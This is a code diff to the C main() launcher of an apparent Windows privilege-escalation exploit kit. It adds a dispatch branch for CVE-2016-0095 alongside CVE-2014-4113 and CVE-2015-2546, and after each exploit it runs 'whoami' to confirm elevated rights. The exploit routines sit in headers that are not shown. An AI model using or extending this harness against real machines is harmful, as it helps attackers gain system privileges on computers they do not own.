@@ -1,8 +1,9 @@
 #include "CVE-2014-4113.h"
 #include "CVE-2015-2546.h"
 #include "CVE-2015-0057.h"
+#include "CVE-2016-0095.h"
 
-#define VUL_NAME "CVE-2015-2546"
+#define VUL_NAME "CVE-2016-0095"
 
 int main()
 {
@@ -10,7 +11,7 @@ int main()
 	{
 		if (Exploit_CVE_2014_4113())
 		{
-			printf("Exploit CVE_2015_2546 完成...\n");
+			printf("Exploit CVE-2014-4113 完成...\n");
 			system("whoami");
 		}
 	}
@@ -18,14 +19,19 @@ int main()
 	{
 		if (Exploit_CVE_2015_2546())
 		{
-			printf("Exploit CVE_2015_2546 完成...\n");
+			printf("Exploit CVE-2015-2546 完成...\n");
 			system("whoami");
 		}
 	}
-	else if (strcmp(VUL_NAME, "CVE-2015-0057") == 0)
+	else if (strcmp(VUL_NAME, "CVE-2016-0095") == 0)
 	{
-
+		if (Exploit_2016_0095())
+		{
+			printf("Exploit CVE-2016-0095 完成...\n");
+			system("whoami");
+		}
 	}
+
 
 	
 	system("pause");
